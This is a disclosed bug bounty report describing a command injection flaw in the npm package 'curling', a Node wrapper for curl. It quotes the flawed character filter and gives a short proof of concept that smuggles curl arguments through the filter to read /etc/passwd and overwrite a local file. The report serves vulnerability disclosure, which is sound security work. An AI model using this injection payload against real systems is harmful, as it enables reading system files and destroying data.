# [curling] Remote Code Execution

## Report Details
- **Report ID**: 973386
- **URL**: https://hackerone.com/reports/973386
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-09-02T18:05:45.807Z
- **Disclosed**: 2021-01-14T08:40:27.267Z

## Reporter
- **Username**: solov9ev
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report `RCE` in `curling`
I can bypass the security check for special characters, read / overwrite file

# Module

**module name:** curling
**version:** 1.1.0
**npm page:** `https://www.npmjs.com/package/curling`

## Module Description

A node wrapper for curl with a very simple api.

## Module Stats

[156] weekly downloads

# Vulnerability

## Vulnerability Description

The regular expression does not perform proper validation and, when combined with curl, leads to disastrous consequences:
```javascript
/[`$&{}[;|]/g.test(command)
```

## Steps To Reproduce:

- Run `npm i curling`

- Create and run the following POC index.js:

```javascript
const curling = require('curling');

curling.run('file:///etc/passwd -o ./index.js', function(d, payload){console.log(payload)});
```

- The exploit worked and overwritten the file - `index.js`

{F973903}

## Patch

Regular expression needs improvement

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Command Injection on `curling` module via insecure command

## Attachments
- curling_rce.mp4
